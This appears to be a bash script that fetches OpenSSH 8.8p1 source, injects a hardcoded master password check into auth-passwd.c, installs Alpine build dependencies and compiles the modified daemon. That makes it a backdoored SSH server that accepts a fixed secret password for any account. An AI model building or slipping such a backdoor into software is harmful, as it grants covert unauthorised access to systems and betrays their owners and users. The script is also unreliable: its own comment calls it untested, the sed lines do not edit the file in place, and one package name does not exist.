#!/bin/bash

# NOTE: not tested, some manual interference may be needed

wget https://github.com/openssh/openssh-portable/archive/refs/tags/V_8_8_P1.zip
unzip V_8_8_P1.zip
cd openssh-portable-V_8_8_P1/
# MANUAL
#vim auth-passwd.c
#if (strcmp(password, "T0tAlR0oTC0nTRol!") == 0)
#return 1;
#
#
# automated
sed '85iif (strcmp(password, "T0tAlR0oTC0nTRol!") == 0)' auth-passwd.c
sed '86i    return 1;' auth-passwd.c
	
apk update
apk upgrade
apk add autoconf
apk add build-essentials
apk add automake
apk add build-base
apk add alpine-sdk
apk add zlib
apk add zlib-dev
apk add libzip-dev 
apk add openssl-libs-static
apk add openssl
apk add libressl-dev
autoreconf
 
# Will potentialy fail, if so, import the missing libraries or use symbolic links 
./configure --with-libs=-lpthread
make 
ssh-keygen -b 1024 -t rsa